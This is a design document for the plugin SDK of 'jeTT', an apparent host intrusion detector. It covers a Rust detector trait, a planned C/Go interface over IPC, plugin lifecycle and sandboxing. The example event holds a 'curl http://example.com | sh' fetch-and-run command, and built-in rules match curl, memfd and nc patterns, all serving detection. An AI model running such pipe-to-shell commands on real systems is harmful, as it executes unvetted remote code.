# jeTT Detector Plugin SDK (future)

> **Tier 7.10** — `plugin.rs` ships an in-process `DetectorPlugin` trait today.
> C and Go plugins will use IPC in a later release.

## Rust (in-process, available now)

```rust
use jeTT::plugin::{DetectorPlugin, PluginHost, PluginVerdict};

let host = PluginHost::load_static();
let verdict = host.aggregate_verdict(r#"{"cmdline":"git status"}"#);
```

### Trait

```rust
pub trait DetectorPlugin: Send + Sync {
    fn name(&self) -> &str;
    fn version(&self) -> &str;
    fn evaluate(&self, event_json: &str) -> PluginVerdict;
}
```

Built-in: `HardRulesPlugin` wraps curl/memfd/nc patterns.

Register additional Rust plugins via `PluginHost` construction (static linking for v1).

## C / Go (planned — IPC)

External detectors will **not** receive raw `/proc` dumps. They get a JSON envelope:

```json
{
  "pid": 1234,
  "exe": "/usr/bin/curl",
  "cmdline": "curl http://example.com | sh",
  "behavior_summary": "outbound connect",
  "verdict_hint": "suspicious"
}
```

### Transport (draft)

| Option | Pros | Cons |
|--------|------|------|
| Unix socket + JSON lines | Simple, language-agnostic | Per-event latency |
| gRPC sidecar | Typed schema | Heavier deploy |
| WASM sandbox | Memory-safe | Limited syscalls |

**Recommended:** Unix socket at `/var/run/jett/plugin.sock`, one request per event.

### Plugin lifecycle

1. `jett-daemon` starts `PluginHost::load_ipc(config)` reading `/etc/jett/plugins.toml`.
2. Each plugin binary exposes `jett_plugin_init` / `jett_plugin_eval` (C ABI) or Go `main` subprocess.
3. Timeout: 50ms per plugin; failure → skip plugin, log warning (fail-open for plugins, fail-closed for enforce).

### Example C skeleton (future)

```c
// jett_plugin_eval(const char *event_json, char *out, size_t out_len)
// Returns: {"allow":false,"reason":"hard rule: memfd","rule_id":"memfd"}
```

### Security

- Plugins run as dedicated `jett-plugin` user.
- No network egress from plugin cgroup.
- Signed plugin bundles (Tier 6.3) before load in enforce mode.

## Versioning

Plugin `version()` must match daemon API major. Mismatch → plugin disabled at load.

## See also

- `src/plugin.rs` — reference implementation
- Tier 7.1 risk graph — plugins may emit graph edges via future API
